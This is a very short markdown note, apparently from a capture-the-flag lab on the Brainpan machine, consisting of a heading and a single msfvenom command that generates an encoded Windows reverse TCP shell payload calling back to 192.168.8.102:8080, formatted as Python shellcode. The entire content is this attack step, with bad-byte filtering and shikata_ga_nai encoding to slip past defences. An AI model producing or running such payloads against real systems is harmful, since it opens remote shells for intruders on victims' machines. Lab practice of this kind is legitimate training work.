# Brainpan

## how to generate playload 

```
msfvenom -a x86 –platform win -p windows/shell/reverse_tcp LHOST=192.168.8.102 LPORT=8080 -b '\x00'  -e x86/shikata_ga_nai -f python
````

